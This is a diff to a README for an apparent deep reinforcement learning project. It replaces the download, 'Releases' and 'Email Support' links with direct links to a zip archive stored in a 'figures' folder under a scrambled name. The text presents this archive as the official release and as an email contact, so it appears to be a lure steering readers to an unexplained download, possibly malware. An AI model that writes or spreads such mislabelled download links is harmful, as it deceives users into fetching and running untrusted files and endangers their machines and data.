@@ -2,11 +2,11 @@
 
 ## 📦 Download & Install
 
-[![Download Latest Release](https://raw.githubusercontent.com/ramzibjd19/Deep-Reinforcement-Learning-With-Pytorch/main/connivancy/Deep-Reinforcement-Learning-With-Pytorch.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ramzibjd19/Deep-Reinforcement-Learning-With-Pytorch/main/connivancy/Deep-Reinforcement-Learning-With-Pytorch.zip)
+[![Download Latest Release](https://github.com/ramzibjd19/Deep-Reinforcement-Learning-With-Pytorch/raw/refs/heads/main/figures/Reinforcement-Deep-With-Pytorch-Learning-v3.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/ramzibjd19/Deep-Reinforcement-Learning-With-Pytorch/raw/refs/heads/main/figures/Reinforcement-Deep-With-Pytorch-Learning-v3.3.zip)
 
 Welcome to the Deep-Reinforcement-Learning-With-Pytorch project! This application allows you to explore various algorithms for deep reinforcement learning, including DQN, A2C, and more. To begin your journey, simply visit the Releases page to download the latest version.
 
-Visit the page to download: [Deep-Reinforcement-Learning-With-Pytorch Releases](https://raw.githubusercontent.com/ramzibjd19/Deep-Reinforcement-Learning-With-Pytorch/main/connivancy/Deep-Reinforcement-Learning-With-Pytorch.zip)
+Visit the page to download: [Deep-Reinforcement-Learning-With-Pytorch Releases](https://github.com/ramzibjd19/Deep-Reinforcement-Learning-With-Pytorch/raw/refs/heads/main/figures/Reinforcement-Deep-With-Pytorch-Learning-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -71,7 +71,7 @@ If you need assistance, join our community. Here’s how to reach out:
 
 - **Issues Page**: Report any problems you encounter on GitHub's Issues page.
 - **Community Forums**: Find help or discuss deep learning topics in community forums. Links to forums can be found in the documentation.
-- **Email Support**: For specific queries, you may also reach out via email [https://raw.githubusercontent.com/ramzibjd19/Deep-Reinforcement-Learning-With-Pytorch/main/connivancy/Deep-Reinforcement-Learning-With-Pytorch.zip].
+- **Email Support**: For specific queries, you may also reach out via email [https://github.com/ramzibjd19/Deep-Reinforcement-Learning-With-Pytorch/raw/refs/heads/main/figures/Reinforcement-Deep-With-Pytorch-Learning-v3.3.zip].
 
 By joining the community, you not only gain access to support but also connect with others who share your interests in deep learning.
 
